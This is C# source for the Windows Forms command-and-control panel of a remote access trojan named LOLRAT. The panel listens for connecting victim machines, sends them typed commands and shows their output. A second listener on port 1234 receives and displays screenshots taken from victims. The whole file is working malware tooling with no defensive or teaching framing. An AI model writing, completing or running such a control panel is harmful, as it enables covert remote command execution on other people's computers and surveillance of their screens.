using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace LOLRAT_C2
{
    public partial class Form1 : Form
    {
        TcpListener server = null;
        Thread listenThread;
        TcpClient client;
        NetworkStream stream;
        bool isListening = false;

        // SS
        private TcpListener serverSS;
        private Image receivedImageSS;

        public Form1()
        {
            InitializeComponent();

            // SS stuff
            receivedImageSS = new Bitmap(1, 1);
            pbSS.Image = receivedImageSS;

            // Start listening for connections in a separate thread
            Thread listenerThread = new Thread(ListenForConnectionsSS);
            listenerThread.IsBackground = true;
            listenerThread.Start();
        }

        private void StartListening()
        {
            try
            {
                int activePort = int.Parse(txtActivePort.Text);
                TcpListener server = new TcpListener(IPAddress.Any, activePort);
                server.Start();
                isListening = true;

                while (isListening)
                {
                    client = server.AcceptTcpClient();
                    Invoke(new Action(() => listBoxClients.Items.Add(client.Client.RemoteEndPoint.ToString())));

                    stream = client.GetStream();
                    Thread receiveThread = new Thread(new ThreadStart(ReceiveData));
                    receiveThread.Start();
                }
            }
            catch (SocketException e)
            {
                MessageBox.Show("SocketException: " + e);
                server.Stop();
            }
        }

        private void ListenForClients()
        {
            if (!isListening)
            {
                listenThread = new Thread(new ThreadStart(StartListening));
                listenThread.Start();
            }
        }

        private void StopListening()
        {
            isListening = false;
            if (server != null)
            {
                server.Stop();
            }
        }

        private void ReceiveData()
        {
            try
            {
                while (isListening)
                {
                    byte[] data = new byte[256];
                    int bytesRead = stream.Read(data, 0, data.Length);
                    if (bytesRead > 0)
                    {
                        string receivedText = Encoding.UTF8.GetString(data, 0, bytesRead);
                        Invoke(new Action(() => txtOutput.AppendText(receivedText + Environment.NewLine)));
                    }
                }
            }
            catch (IOException e)
            {
                if (isListening)
                {
                    MessageBox.Show("IOException: " + e);
                    client.Close();
                }
            }
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            if (!isListening)
            {
                ListenForClients();
                btnListen.Text = "Stop Listening";
            }
            else
            {
                StopListening();
                btnListen.Text = "Start Listening";
            }
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            if (listBoxClients.SelectedItem != null && txtCommand.Text != "")
            {
                try
                {
                    byte[] data = Encoding.ASCII.GetBytes(txtCommand.Text);
                    stream.Write(data, 0, data.Length);
                }
                catch (IOException ex)
                {
                    MessageBox.Show("IOException: " + ex);
                }
            }
        }




        // SS
        private void ListenForConnectionsSS()
        {
            try
            {
                serverSS = new TcpListener(IPAddress.Any, 1234);
                serverSS.Start();
                Console.WriteLine("Waiting for a connection...");

                while (true)
                {
                    using (TcpClient client = serverSS.AcceptTcpClient())
                    {
                        string clientAddress = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                        Console.WriteLine("Accepted connection from " + clientAddress);
                        AppendToOutput("Accepted connection from " + clientAddress);

                        using (NetworkStream stream = client.GetStream())
                        using (BinaryReader reader = new BinaryReader(stream))
                        {
                            int imageSize = Math.Abs(reader.ReadInt32());
                            if (imageSize > 0)
                            {
                                Console.WriteLine("Receiving image of size: " + imageSize);
                                AppendToOutput("Receiving image of size: " + imageSize);

                                byte[] imageData = reader.ReadBytes(imageSize);
                                using (MemoryStream memoryStream = new MemoryStream(imageData))
                                {
                                    receivedImageSS = Image.FromStream(memoryStream);
                                }

                                // Display the received image in the PictureBox (Invoke on the main thread)
                                pbSS.Invoke((MethodInvoker)delegate
                                {
                                    pbSS.Invalidate();
                                    pbSS.Image = receivedImageSS;
                                    pbSS.Invalidate();
                                    pbSS.Refresh();
                                });
                            }
                            else
                            {
                                Console.WriteLine("Invalid image size received: " + imageSize);
                                AppendToOutput("Invalid image size received: " + imageSize);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                AppendToOutput("Exception: " + ex.ToString());
            }
        }


        private void AppendToOutput(string text)
        {
            // Invoke to update the TextBox on the main thread
            txtOutput.Invoke((MethodInvoker)delegate
            {
                txtOutput.AppendText(text + Environment.NewLine);
            });
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            StopListening();
            Environment.Exit(0);
        }
       
    }
}
